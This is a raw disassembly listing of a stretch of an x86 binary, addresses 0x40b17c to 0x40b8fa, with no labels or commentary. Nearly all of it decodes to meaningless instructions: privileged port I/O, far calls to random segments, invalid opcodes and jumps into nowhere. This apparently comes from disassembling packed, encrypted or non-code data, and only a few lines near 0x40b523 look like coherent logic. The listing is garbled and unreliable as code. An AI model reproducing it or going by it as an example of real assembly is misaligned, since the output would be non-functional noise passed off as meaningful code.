  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b108
  40b180:	jnp    0x40b160
  40b182:	mov    fs,WORD PTR [esi-0x417bd208]
  40b188:	ins    BYTE PTR es:[edi],dx
  40b189:	lock mov ch,BYTE PTR [ebx+0x92b7da1]
  40b190:	cld    
  40b191:	outs   dx,BYTE PTR ds:[si]
  40b193:	neg    BYTE PTR [esi+0x19d29cc7]
  40b199:	adc    eax,0x19fe9f7b
  40b19e:	jle    0x40b197
  40b1a0:	jle    0x40b1de
  40b1a2:	adc    ch,ch
  40b1a4:	mov    ebx,0xe325c3b
  40b1a9:	sub    ah,bh
  40b1ab:	mov    dh,0x77
  40b1ad:	loop   0x40b1fa
  40b1af:	aas    
  40b1b0:	mov    bl,0xab
  40b1b2:	shl    DWORD PTR [ecx+eax*8+0x541969fe],cl
  40b1b9:	call   0xd8fba9bd
  40b1be:	out    0x60,al
  40b1c0:	bound  esp,QWORD PTR [edi-0x596c9416]
  40b1c6:	xlat   BYTE PTR ds:[ebx]
  40b1c7:	add    ch,BYTE PTR [edx+0x31]
  40b1ca:	push   edx
  40b1cb:	add    eax,0xf7ccfcf7
  40b1d0:	outs   dx,DWORD PTR ds:[esi]
  40b1d1:	sub    ecx,edi
  40b1d3:	add    dh,BYTE PTR [edi]
  40b1d5:	mov    bh,0x4b
  40b1d7:	xchg   ecx,eax
  40b1d8:	lods   eax,DWORD PTR ds:[esi]
  40b1d9:	or     eax,0x695f6e74
  40b1de:	pusha  
  40b1df:	iret   
  40b1e0:	push   esi
  40b1e1:	mov    ebx,esp
  40b1e3:	sub    eax,ebx
  40b1e5:	inc    eax
  40b1e6:	ds repz dec ecx
  40b1e9:	cmp    eax,0x9bb9a496
  40b1ee:	cmp    BYTE PTR [eax-0x65],bh
  40b1f1:	cmp    al,0x80
  40b1f3:	fcomp  DWORD PTR [ecx]
  40b1f5:	sahf   
  40b1f6:	loop   0x40b1bf
  40b1f8:	retf   
  40b1f9:	sbb    al,0x69
  40b1fb:	sti    
  40b1fc:	fstp   DWORD PTR [ebp-0x7f4312cc]
  40b202:	fldcw  WORD PTR [edi]
  40b204:	xchg   esi,eax
  40b205:	and    eax,0xa2cb4d75
  40b20a:	nop
  40b20b:	mov    dh,0x90
  40b20d:	mov    edx,0xecd623f
  40b212:	cwde   
  40b213:	mov    edx,0x84e57b01
  40b218:	xor    bl,0xf
  40b21b:	mov    ch,0x17
  40b21d:	cmp    eax,0x7aae5bc5
  40b222:	dec    ecx
  40b223:	sbb    dl,BYTE PTR [edx]
  40b225:	xor    DWORD PTR [ebx-0x6ba53fc4],ebp
  40b22b:	inc    esp
  40b22c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b22d:	add    al,bl
  40b22f:	sub    esi,DWORD PTR [ecx]
  40b231:	fst    DWORD PTR [edi+0x1]
  40b234:	mov    al,ds:0xbb09f8ec
  40b239:	jmp    0x417f01d0
  40b23e:	es je  0x40b2b6
  40b241:	push   es
  40b242:	ja     0x40b27c
  40b244:	ret    0x5fcd
  40b247:	es jbe 0x40b2c4
  40b24a:	jmp    0x9caedf6f
  40b24f:	xor    eax,0x515ca441
  40b254:	or     DWORD PTR [ebx+0x7a],eax
  40b257:	cdq    
  40b258:	dec    ebx
  40b259:	add    al,cl
  40b25b:	ror    BYTE PTR [edi+0x4f],0xe
  40b25f:	dec    esp
  40b260:	inc    edi
  40b261:	xchg   ebx,eax
  40b262:	mov    WORD PTR [edi+0x32ba4b72],gs
  40b268:	add    DWORD PTR ds:0xaad75e79,ebp
  40b26e:	cwde   
  40b26f:	out    dx,eax
  40b270:	or     DWORD PTR [esi+edx*4-0x1a14083b],eax
  40b277:	adc    ah,BYTE PTR [eax+0x33]
  40b27a:	jmp    0x568540e3
  40b27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b280:	out    0x46,eax
  40b282:	dec    ecx
  40b283:	pop    ebp
  40b284:	jns    0x40b28c
  40b286:	mov    eax,0x5ea7ee2f
  40b28b:	mov    edx,0xe276c1ef
  40b290:	fdivr  st(2),st
  40b292:	ret    0xf3a9
  40b295:	pop    edx
  40b296:	inc    ebx
  40b297:	nop
  40b298:	out    dx,eax
  40b299:	adc    BYTE PTR [ebx-0x36e0cda4],ch
  40b29f:	mov    ebp,0x940527a7
  40b2a4:	sub    bh,al
  40b2a6:	popf   
  40b2a7:	mov    ah,0x4d
  40b2a9:	sar    BYTE PTR [edi],1
  40b2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ac:	(bad)  
  40b2ad:	push   ebx
  40b2ae:	aas    
  40b2af:	and    eax,0xb35254fb
  40b2b4:	pop    esi
  40b2b5:	repz call 0x1f1f:0xd192c95b
  40b2bd:	sub    al,0x59
  40b2bf:	test   eax,0x91bf6a06
  40b2c4:	fidivr DWORD PTR [esi+ecx*1]
  40b2c7:	pop    es
  40b2c8:	mov    eax,0xd2f04984
  40b2cd:	jmp    0x40b2ad
  40b2cf:	lahf   
  40b2d0:	outs   dx,DWORD PTR ds:[esi]
  40b2d1:	(bad)  
  40b2d2:	sub    al,0xa0
  40b2d4:	aam    0x22
  40b2d6:	and    dh,BYTE PTR [ebx+0x1f]
  40b2d9:	sub    dl,cl
  40b2db:	or     DWORD PTR [edx+0x1b2dbca1],esp
  40b2e1:	imul   BYTE PTR [ecx+0x7fe4fb60]
  40b2e7:	inc    ecx
  40b2e8:	dec    edx
  40b2e9:	push   ecx
  40b2ea:	idiv   DWORD PTR [ecx+0x7c72ef5a]
  40b2f0:	mov    WORD PTR [ebx],ss
  40b2f2:	xchg   ecx,eax
  40b2f3:	inc    edi
  40b2f4:	and    ebx,DWORD PTR [esi]
  40b2f6:	fcomp  QWORD PTR [eax]
  40b2f8:	pusha  
  40b2f9:	dec    ecx
  40b2fa:	stos   BYTE PTR es:[edi],al
  40b2fb:	dec    esp
  40b2fc:	sar    DWORD PTR [ecx],0x8f
  40b2ff:	stos   BYTE PTR es:[edi],al
  40b300:	pop    ebx
  40b301:	nop
  40b302:	fs inc eax
  40b304:	pop    edx
  40b305:	cmp    eax,0x393c381c
  40b30a:	hlt    
  40b30b:	cmp    eax,0xbb37a841
  40b310:	call   0x5cf5:0xad3530ac
  40b317:	sar    BYTE PTR [edi-0x143e8ddf],cl
  40b31d:	cmp    eax,0x2fb5c1dc
  40b322:	lock fwait
  40b324:	repz test DWORD PTR [esp+esi*1+0x9],ecx
  40b329:	sub    BYTE PTR [ebx+eiz*4-0x3f7944a8],0xc3
  40b331:	call   FWORD PTR [eax]
  40b333:	das    
  40b334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b335:	arpl   WORD PTR [esi],bx
  40b337:	mov    ecx,0xd3872068
  40b33c:	mov    WORD PTR [ecx],ss
  40b33e:	xor    eax,0x2a4bce3
  40b343:	push   esi
  40b344:	pop    ecx
  40b345:	dec    edx
  40b346:	test   al,0x36
  40b348:	sbb    DWORD PTR [ebp-0x74],ebp
  40b34b:	pop    edi
  40b34c:	shl    DWORD PTR [edi+0x43],0x40
  40b350:	call   0x84bed6d2
  40b355:	repz add eax,0xa8111347
  40b35b:	jmp    0x84ea:0xbb7e577
  40b362:	or     al,0x1
  40b364:	xor    eax,0x37d3becb
  40b369:	lahf   
  40b36a:	cmp    cl,BYTE PTR [esi+0x55]
  40b36d:	lahf   
  40b36e:	adc    eax,0x63f94c39
  40b373:	dec    ebp
  40b374:	cmp    bh,BYTE PTR [edi-0x429445ff]
  40b37a:	popf   
  40b37b:	push   es
  40b37c:	jb     0x40b3b2
  40b37e:	pop    ecx
  40b37f:	or     DWORD PTR [edi],edi
  40b381:	ficom  WORD PTR [esi+0x6c415205]
  40b387:	sbb    dh,BYTE PTR [edi]
  40b389:	std    
  40b38a:	into   
  40b38b:	adc    ebx,ebx
  40b38d:	lahf   
  40b38e:	push   0x44be83a
  40b393:	out    dx,eax
  40b394:	and    dl,BYTE PTR [ebx]
  40b396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b398:	stos   DWORD PTR es:[edi],eax
  40b399:	push   0xc4bb5bfc
  40b39e:	cvtps2pi mm3,QWORD PTR [eax]
  40b3a1:	gs pop ebx
  40b3a3:	mov    ss,ecx
  40b3a5:	xchg   esi,eax
  40b3a6:	icebp  
  40b3a7:	(bad)  
  40b3a9:	xchg   ebx,eax
  40b3aa:	(bad)  [esi-0x5ccea321]
  40b3b0:	xor    eax,0x53ff48e7
  40b3b5:	sar    BYTE PTR [eax],cl
  40b3b7:	and    DWORD PTR [ebp-0x75bbc5a],edi
  40b3bd:	sti    
  40b3be:	mov    BYTE PTR [eax+0x37a1c65f],cl
  40b3c4:	pop    ss
  40b3c5:	add    eax,0x900a3a7c
  40b3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3cb:	jno    0x40b403
  40b3cd:	arpl   bx,bx
  40b3cf:	test   esp,0x4cec518e
  40b3d5:	aas    
  40b3d6:	mov    ah,0xd1
  40b3d8:	mov    eax,ds:0x839248ed
  40b3dd:	adc    dh,dh
  40b3df:	loopne 0x40b415
  40b3e1:	and    eax,0x4bd6a9ca
  40b3e6:	jmp    0x40b3aa
  40b3e8:	xchg   ecx,eax
  40b3e9:	loope  0x40b374
  40b3eb:	push   DWORD PTR [esi+0x4]
  40b3ee:	aaa    
  40b3ef:	jecxz  0x40b40f
  40b3f1:	jecxz  0x40b375
  40b3f3:	adc    ebx,DWORD PTR [edx]
  40b3f5:	or     eax,0xcf50a598
  40b3fa:	(bad)  
  40b3fb:	lods   al,BYTE PTR ds:[esi]
  40b3fc:	fistp  QWORD PTR [ebp-0x6e]
  40b3ff:	fbld   TBYTE PTR [ecx+eax*2+0x76]
  40b403:	aad    0xc9
  40b405:	or     DWORD PTR ds:0xb0bc407,eax
  40b40b:	push   cs
  40b40c:	add    ebx,0x7cb57368
  40b412:	mov    BYTE PTR [edx],cl
  40b414:	in     al,0x29
  40b416:	adc    eax,0x1b2c5062
  40b41b:	out    0xb1,al
  40b41d:	add    ch,BYTE PTR [edx-0x43e4a08f]
  40b423:	jno    0x40b3bc
  40b425:	sbb    BYTE PTR [edi+0x4498a6f5],cl
  40b42b:	mov    DWORD PTR [edx+0x4b],0xce97cfa5
  40b432:	stc    
  40b433:	jnp    0x40b40d
  40b435:	add    BYTE PTR [eax-0x5fba1499],dl
  40b43b:	dec    ebp
  40b43c:	loope  0x40b479
  40b43e:	outs   dx,DWORD PTR ds:[esi]
  40b43f:	sbb    DWORD PTR [ebp-0x78],esi
  40b442:	sub    al,BYTE PTR [eax+0x2bc51ce6]
  40b448:	pusha  
  40b449:	inc    eax
  40b44a:	add    bh,bh
  40b44c:	arpl   WORD PTR [esi+0x3620809b],bp
  40b452:	xchg   BYTE PTR [eax-0x4ed11c3f],bh
  40b458:	mov    ecx,0x97ded631
  40b45d:	gs xchg edx,eax
  40b45f:	mov    cl,0x9c
  40b461:	sub    eax,0xbebcd532
  40b466:	aam    0xf9
  40b468:	inc    esp
  40b469:	pusha  
  40b46a:	cmp    dl,BYTE PTR [esi-0x28]
  40b46d:	sar    ebp,0xd9
  40b470:	sub    DWORD PTR [ecx+0x1e],edi
  40b473:	adc    BYTE PTR [edi-0xa2a5f1],ah
  40b479:	pop    edi
  40b47a:	dec    esp
  40b47b:	cmp    BYTE PTR [ebx],bl
  40b47d:	add    DWORD PTR [ebp+ebp*4-0x4e],ebp
  40b481:	sbb    al,0xc3
  40b483:	and    BYTE PTR [edi+eiz*8-0x15],al
  40b487:	lods   al,BYTE PTR ds:[esi]
  40b488:	(bad)  
  40b489:	int3   
  40b48a:	(bad)  
  40b48b:	pop    edi
  40b48c:	pop    ebx
  40b48d:	pop    edi
  40b48e:	push   edi
  40b48f:	xchg   ecx,eax
  40b490:	in     eax,0xfe
  40b492:	test   ebp,ecx
  40b494:	and    BYTE PTR [edi+esi*4],0xb7
  40b498:	stos   DWORD PTR es:[edi],eax
  40b499:	cdq    
  40b49a:	(bad)  
  40b49b:	sbb    ch,ah
  40b49d:	repnz xor BYTE PTR [eax+0x1f4c8617],dh
  40b4a4:	dec    esi
  40b4a5:	cmp    edx,ebx
  40b4a7:	sahf   
  40b4a8:	dec    esp
  40b4a9:	jnp    0x40b4dc
  40b4ab:	xchg   ebx,eax
  40b4ac:	cs dec esp
  40b4ae:	addr16 mov ecx,0x36faa2a5
  40b4b4:	pop    eax
  40b4b5:	rcl    DWORD PTR [esi+0x27b99db8],0xe2
  40b4bc:	mov    al,ds:0x6ff4371f
  40b4c1:	aam    0xf8
  40b4c3:	out    dx,eax
  40b4c4:	add    eax,0x21fa266b
  40b4c9:	dec    ebx
  40b4ca:	fisub  DWORD PTR [ecx-0x7cfa9c57]
  40b4d0:	mov    DWORD PTR [edx-0x48],ecx
  40b4d3:	adc    eax,0xca5291d9
  40b4d8:	push   ds
  40b4d9:	fdivr  QWORD PTR [edi]
  40b4db:	pop    esi
  40b4dc:	lahf   
  40b4dd:	xchg   eax,esi
  40b4df:	inc    ecx
  40b4e0:	xchg   esp,eax
  40b4e1:	push   edx
  40b4e2:	call   0xef725a69
  40b4e7:	pop    edx
  40b4e8:	stos   BYTE PTR es:[edi],al
  40b4e9:	sbb    BYTE PTR [ecx+0x44],dl
  40b4ec:	adc    eax,0x43febda2
  40b4f1:	icebp  
  40b4f2:	push   edi
  40b4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4f4:	cmp    dl,dl
  40b4f6:	cmp    BYTE PTR [ecx-0x3f4f3922],0x5
  40b4fd:	sbb    eax,0x6a291774
  40b502:	cli    
  40b503:	adc    ah,BYTE PTR [ecx-0x53]
  40b506:	push   ss
  40b507:	xchg   edx,eax
  40b508:	xchg   DWORD PTR [eax-0x7b4b7ef7],edi
  40b50e:	sbb    BYTE PTR ds:0x39d058d8,ch
  40b514:	and    bh,bh
  40b516:	ja     0x40b518
  40b518:	cmp    dl,BYTE PTR [ecx]
  40b51a:	ret    0x4ca9
  40b51d:	out    dx,al
  40b51e:	out    dx,al
  40b51f:	mov    bh,0xf
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	test   bl,dh
  40b551:	gs mov esi,0x707086c1
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b58f
  40b55c:	outs   dx,DWORD PTR ds:[esi]
  40b55d:	push   cs
  40b55e:	aas    
  40b55f:	sbb    al,0x67
  40b561:	popa   
  40b562:	add    ebx,edi
  40b564:	int3   
  40b565:	mov    edi,DWORD PTR [esi-0x6ef0c68a]
  40b56b:	push   ebp
  40b56c:	inc    ebp
  40b56d:	push   ecx
  40b56e:	ret    0x67a0
  40b571:	sbb    bh,0x33
  40b574:	sar    BYTE PTR [ecx+ebp*4+0x36],1
  40b578:	and    DWORD PTR [edi+0x3e902b7e],0xffffffb9
  40b57f:	inc    ebx
  40b580:	pushf  
  40b581:	shl    DWORD PTR [ebx],1
  40b583:	jmp    0xca2f25bd
  40b588:	mov    ebx,0xf8693c1d
  40b58d:	jge    0x40b559
  40b58f:	test   esp,ecx
  40b591:	shr    bh,1
  40b593:	out    0x49,eax
  40b595:	ds sbb al,0xba
  40b598:	ins    DWORD PTR es:[edi],dx
  40b599:	mov    bh,0x84
  40b59b:	jo     0x40b51f
  40b59d:	jmp    0x40b567
  40b59f:	mov    ecx,0xa6ec418c
  40b5a4:	ins    BYTE PTR es:[edi],dx
  40b5a5:	and    al,0xee
  40b5a7:	mov    ss,edx
  40b5a9:	sub    DWORD PTR [ebp+0x300d3ffb],esi
  40b5af:	fstp   st(6)
  40b5b1:	mov    edx,DWORD PTR [ebp+0x65bdcc37]
  40b5b7:	cli    
  40b5b8:	xor    DWORD PTR [eax+0x46],ebp
  40b5bb:	js     0x40b590
  40b5bd:	sub    al,0xbd
  40b5bf:	lahf   
  40b5c0:	out    0x8e,eax
  40b5c2:	mov    dh,0x2f
  40b5c4:	inc    eax
  40b5c5:	popf   
  40b5c6:	mov    esi,0xe92f60b0
  40b5cb:	sbb    edx,DWORD PTR [ecx+ebp*4-0x4b2ae1ba]
  40b5d2:	test   DWORD PTR [ebx-0xf349a30],ebp
  40b5d8:	sub    BYTE PTR [esi+eiz*4+0x5caafe0c],dl
  40b5df:	fidiv  DWORD PTR [ebp-0x34]
  40b5e2:	mov    al,0xb0
  40b5e4:	xor    eax,0x339831f6
  40b5e9:	int3   
  40b5ea:	cmp    esi,DWORD PTR [edi]
  40b5ec:	sbb    ah,BYTE PTR [edx+0x2c]
  40b5ef:	inc    ebx
  40b5f0:	lahf   
  40b5f1:	and    BYTE PTR [eax],bl
  40b5f3:	lds    edx,FWORD PTR [esi-0x20]
  40b5f6:	adc    DWORD PTR [ebp-0x17],ecx
  40b5f9:	adc    al,0x69
  40b5fb:	push   ebp
  40b5fc:	fldcw  WORD PTR [esp+edx*1+0x6ec24f2a]
  40b603:	dec    edi
  40b604:	clc    
  40b605:	push   eax
  40b606:	sub    cl,cl
  40b608:	inc    edx
  40b609:	inc    ebp
  40b60a:	xor    DWORD PTR [edi],ecx
  40b60c:	dec    edi
  40b60d:	ss pop es
  40b60f:	shl    BYTE PTR ds:0x758d033,0x7b
  40b616:	outs   dx,DWORD PTR ds:[esi]
  40b617:	jae    0x40b60a
  40b619:	fstp   DWORD PTR [eax]
  40b61b:	iret   
  40b61c:	mov    al,ds:0x27a25c5b
  40b621:	xchg   ebp,eax
  40b622:	stos   BYTE PTR es:[edi],al
  40b623:	push   ecx
  40b624:	jo     0x40b5f4
  40b626:	(bad)  
  40b627:	xchg   esi,eax
  40b628:	dec    ebx
  40b629:	clc    
  40b62a:	inc    ebx
  40b62b:	adc    edi,DWORD PTR [ecx+0x3d812493]
  40b631:	in     eax,0x24
  40b633:	(bad)  
  40b634:	mov    eax,ds:0x33153f64
  40b639:	enter  0x391c,0x17
  40b63d:	or     BYTE PTR [edx],cl
  40b63f:	xor    edi,0xffffffa3
  40b642:	dec    edx
  40b643:	jecxz  0x40b617
  40b645:	add    DWORD PTR [eax-0x31],0xd7814d5e
  40b64c:	add    al,0x1e
  40b64e:	xor    eax,0x9a80bd1e
  40b653:	sub    bh,0x6
  40b656:	jmp    0x5fdeea45
  40b65b:	jp     0x40b681
  40b65d:	stos   DWORD PTR es:[edi],eax
  40b65e:	nop
  40b65f:	lock addr16 int 0x5f
  40b663:	loopne 0x40b6b9
  40b665:	call   0xf2306cd9
  40b66a:	add    BYTE PTR [eax-0x51b8bf2e],bl
  40b670:	ss (bad) 
  40b672:	jnp    0x40b6f1
  40b674:	sub    DWORD PTR [ecx+0x2ba97b12],esp
  40b67a:	sbb    al,0xdc
  40b67c:	ja     0x40b6ce
  40b67e:	jmp    0xdaa9:0x4b95e5dd
  40b685:	popf   
  40b686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b687:	inc    ebp
  40b688:	inc    ebp
  40b689:	jp     0x40b61f
  40b68b:	add    bh,bh
  40b68d:	out    dx,eax
  40b68e:	pop    edx
  40b68f:	xchg   edi,eax
  40b690:	inc    edi
  40b691:	sbb    esp,DWORD PTR [ebx]
  40b693:	adc    edi,esp
  40b695:	and    al,BYTE PTR [esi-0x2cd37ad]
  40b69b:	sbb    eax,0xffb0ed7f
  40b6a0:	je     0x40b6f9
  40b6a2:	mov    cl,0xf8
  40b6a4:	in     al,0x8
  40b6a6:	jne    0x40b682
  40b6a8:	xchg   edi,eax
  40b6a9:	sbb    DWORD PTR [eax-0x480f86a],ecx
  40b6af:	mov    dl,0xe7
  40b6b1:	call   0xce27a158
  40b6b6:	xchg   ecx,eax
  40b6b7:	cmp    al,0x47
  40b6b9:	mov    esi,0x6579c5c7
  40b6be:	int    0x99
  40b6c0:	leave  
  40b6c1:	cwde   
  40b6c2:	(bad)  
  40b6c3:	test   DWORD PTR [ecx],0x87cef889
  40b6c9:	fcmovnu st,st(6)
  40b6cb:	push   ebx
  40b6cc:	and    al,0x1
  40b6ce:	leave  
  40b6cf:	sar    DWORD PTR [ebx],cl
  40b6d1:	pop    ss
  40b6d2:	loopne 0x40b6be
  40b6d4:	lods   eax,DWORD PTR ds:[esi]
  40b6d5:	popf   
  40b6d6:	mov    ds:0x2d859358,al
  40b6db:	sub    eax,DWORD PTR [ecx+0x78ad44cd]
  40b6e1:	mov    dh,0xd5
  40b6e3:	push   ebp
  40b6e4:	dec    ecx
  40b6e5:	and    BYTE PTR [ebp+edx*4+0x6a],al
  40b6e9:	test   eax,0x7c21ca89
  40b6ee:	shl    ch,1
  40b6f0:	cmp    dl,dl
  40b6f2:	xchg   esi,eax
  40b6f3:	(bad)  
  40b6f4:	adc    BYTE PTR [ecx],cl
  40b6f6:	xor    DWORD PTR es:[ebx],ebp
  40b6f9:	hlt    
  40b6fa:	clc    
  40b6fb:	or     BYTE PTR [eax+0x2d79dcad],al
  40b701:	jnp    0x40b77b
  40b703:	mov    esi,DWORD PTR [edi]
  40b705:	and    ebp,DWORD PTR [esi]
  40b707:	shr    DWORD PTR [edx+0x6a],cl
  40b70a:	mov    dh,0x5
  40b70c:	or     esp,esp
  40b70e:	ins    BYTE PTR es:[edi],dx
  40b70f:	cmp    dl,cl
  40b711:	cmp    esp,DWORD PTR [ebx+0x474025ad]
  40b717:	leave  
  40b718:	xlat   BYTE PTR ds:[ebx]
  40b719:	xor    al,0xa4
  40b71b:	ret    0x1cd6
  40b71e:	ins    BYTE PTR es:[edi],dx
  40b71f:	mov    bl,0xeb
  40b721:	push   edi
  40b722:	add    DWORD PTR [ebx+0x57],esp
  40b725:	mov    esp,0xb629355a
  40b72a:	inc    ecx
  40b72b:	jns    0x40b75a
  40b72d:	push   0x68
  40b72f:	mov    cl,0xc9
  40b731:	and    dh,BYTE PTR [eax-0x2c7e166c]
  40b737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b738:	push   0xaf807ea6
  40b73d:	xor    BYTE PTR [esi],bh
  40b73f:	lods   al,BYTE PTR ds:[esi]
  40b740:	call   0x48a929d8
  40b745:	sub    DWORD PTR [edx+edi*1],edi
  40b748:	dec    ecx
  40b749:	xchg   ecx,eax
  40b74a:	jae    0x40b6e4
  40b74c:	aam    0x9d
  40b74e:	nop
  40b74f:	into   
  40b750:	not    DWORD PTR [eax+0x77]
  40b753:	xchg   ebx,eax
  40b754:	adc    edi,DWORD PTR ds:0x774fa0c0
  40b75a:	xchg   ah,dh
  40b75c:	shl    esi,cl
  40b75e:	xchg   DWORD PTR [ecx+ebp*2],ebp
  40b761:	jno    0x40b709
  40b763:	sbb    DWORD PTR [ebx],ecx
  40b765:	mov    esp,edi
  40b767:	xor    eax,0xab8e829
  40b76c:	call   0xe01e:0x3fc484cc
  40b773:	mov    eax,ds:0xe109bd9b
  40b778:	test   DWORD PTR [edx+edx*2-0x2a],edx
  40b77c:	jne    0x40b750
  40b77e:	add    cl,BYTE PTR [ebx+0x6b]
  40b781:	or     eax,DWORD PTR [esi]
  40b783:	inc    eax
  40b784:	jl     0x40b7b2
  40b786:	sbb    BYTE PTR es:[esi],ch
  40b789:	add    esi,0xb973a79a
  40b78f:	(bad)  
  40b790:	xchg   edi,eax
  40b791:	xchg   esi,eax
  40b792:	(bad)  
  40b793:	pop    ebp
  40b794:	fiadd  WORD PTR [eax+ecx*1+0x467042f0]
  40b79b:	mov    cl,0x62
  40b79d:	lahf   
  40b79e:	or     BYTE PTR [edx-0x35],al
  40b7a1:	cld    
  40b7a2:	add    eax,0xe33d9f8
  40b7a7:	xor    al,0xb4
  40b7a9:	in     eax,0x94
  40b7ab:	pop    es
  40b7ac:	dec    ebx
  40b7ad:	out    0xa9,eax
  40b7af:	inc    edx
  40b7b0:	adc    BYTE PTR [ebx-0x63],bh
  40b7b3:	xor    al,0xfa
  40b7b5:	xor    BYTE PTR [edi-0x4a],0xdc
  40b7b9:	lock inc esp
  40b7bb:	and    ch,dh
  40b7bd:	mov    ah,0xf8
  40b7bf:	ins    BYTE PTR es:[edi],dx
  40b7c0:	mov    cl,0x0
  40b7c2:	jg     0x40b778
  40b7c4:	call   0xb3dac106
  40b7c9:	dec    esi
  40b7ca:	mov    edx,0xa7bc02e3
  40b7cf:	sahf   
  40b7d0:	fidiv  DWORD PTR [ebx-0x26]
  40b7d3:	and    eax,0xf682588a
  40b7d8:	(bad)  
  40b7d9:	push   eax
  40b7da:	(bad)  
  40b7db:	repz into 
  40b7dd:	sbb    DWORD PTR [edx-0x38],0xfe5cc48c
  40b7e4:	cmp    edi,DWORD PTR [edx]
  40b7e6:	pop    ss
  40b7e7:	jl     0x40b778
  40b7e9:	xchg   BYTE PTR gs:[esp+ecx*8+0x16],dl
  40b7ee:	pop    eax
  40b7ef:	test   DWORD PTR [eax+0x4],esp
  40b7f2:	cli    
  40b7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7f4:	je     0x40b84b
  40b7f6:	cmp    ch,ch
  40b7f8:	mov    ds:0x2987d45f,al
  40b7fd:	imul   BYTE PTR [edi-0x440b9084]
  40b803:	inc    esi
  40b804:	(bad)  
  40b805:	sub    BYTE PTR [edx],ch
  40b807:	mov    esp,?
  40b809:	dec    esi
  40b80a:	inc    DWORD PTR [ebp+0x3b]
  40b80d:	fsubrp st(7),st
  40b80f:	mov    ah,BYTE PTR [eax-0x11]
  40b812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b813:	pop    ebp
  40b814:	mov    ebx,0x4c338b36
  40b819:	das    
  40b81a:	iret   
  40b81b:	and    esp,DWORD PTR [ebx]
  40b81d:	dec    esi
  40b81e:	add    BYTE PTR [edx+0x41dd07dc],bh
  40b824:	xor    DWORD PTR [ecx+0xe49966e],ebp
  40b82a:	cmp    BYTE PTR [edx-0xa],bl
  40b82d:	lock data16 fsub QWORD PTR [edx]
  40b831:	lea    ecx,[ebx-0x4]
  40b834:	das    
  40b835:	pusha  
  40b836:	xchg   esp,eax
  40b837:	jp     0x40b800
  40b839:	loopne 0x40b810
  40b83b:	lock ins BYTE PTR es:[edi],dx
  40b83d:	ficomp WORD PTR [esi+esi*1+0x22]
  40b841:	and    esp,DWORD PTR [eax+0x6b8384e4]
  40b847:	dec    eax
  40b848:	cmp    cl,0xc2
  40b84b:	imul   eax,DWORD PTR [ebp+eax*2+0x4fff57e3],0xfab2471
  40b856:	and    ecx,DWORD PTR ds:0x1c776be
  40b85c:	add    BYTE PTR [ebp-0x6b],bl
  40b85f:	(bad)  
  40b860:	xor    BYTE PTR [edi],ch
  40b862:	fwait
  40b863:	iret   
  40b864:	dec    esp
  40b865:	ins    BYTE PTR es:[edi],dx
  40b866:	rcl    BYTE PTR [eax-0x5c5c25cf],cl
  40b86c:	mov    BYTE PTR [esi+0xa],al
  40b86f:	repz or esp,DWORD PTR [esi]
  40b872:	int    0xca
  40b874:	adc    dh,BYTE PTR [eax]
  40b876:	retf   0x96a6
  40b879:	dec    DWORD PTR [edx]
  40b87b:	sbb    DWORD PTR [ebx+ebp*4-0x65],0xa9fb1d3e
  40b883:	pop    ebp
  40b884:	shl    DWORD PTR [ecx],1
  40b886:	fcmovu st,st(0)
  40b888:	mov    esp,0x42a81099
  40b88d:	pop    ss
  40b88e:	xor    BYTE PTR [edi+0x525e581a],0xbe
  40b895:	mov    esi,0xd3824358
  40b89a:	lods   eax,DWORD PTR ds:[esi]
  40b89b:	cmp    ch,cl
  40b89d:	lahf   
  40b89e:	retf   0x4b2b
  40b8a1:	jae    0x40b823
  40b8a3:	jbe    0x40b866
  40b8a5:	sar    DWORD PTR [ecx-0x15],cl
  40b8a8:	(bad)  
  40b8a9:	push   edx
  40b8aa:	in     eax,0x90
  40b8ac:	test   BYTE PTR [ecx],ch
  40b8ae:	bound  ebx,QWORD PTR [edi+0x53e4b710]
  40b8b4:	outs   dx,BYTE PTR ds:[esi]
  40b8b5:	(bad)  [esi+eiz*4]
  40b8b8:	bound  esp,QWORD PTR [edi]
  40b8ba:	jbe    0x40b8bb
  40b8bc:	fadd   DWORD PTR [edx+ebp*1+0x210f928d]
  40b8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8c4:	std    
  40b8c5:	sbb    DWORD PTR [edi+ecx*8],ebx
  40b8c8:	pop    ds
  40b8c9:	mov    WORD PTR [esi-0x72],fs
  40b8cc:	aam    0xb9
  40b8ce:	xchg   ebp,eax
  40b8cf:	ds push 0xe7b88a79
  40b8d5:	retf   0xb4ee
  40b8d8:	stos   DWORD PTR es:[edi],eax
  40b8d9:	cmc    
  40b8da:	mov    ch,0x77
  40b8dc:	fadd   DWORD PTR [ebp+0x71]
  40b8df:	retf   0x5b53
  40b8e2:	ror    BYTE PTR gs:[esi],0x9a
  40b8e6:	mov    cl,0x85
  40b8e8:	imul   edx,DWORD PTR [edx+0x6e],0x7b
  40b8ec:	or     al,0xa0
  40b8ee:	sub    esp,DWORD PTR [edi+ebp*1]
  40b8f1:	inc    ebx
  40b8f2:	imul   ecx,DWORD PTR [eax],0x13f38a5
  40b8f8:	jns    0x40b922
  40b8fa:	jbe    0x40b8f3
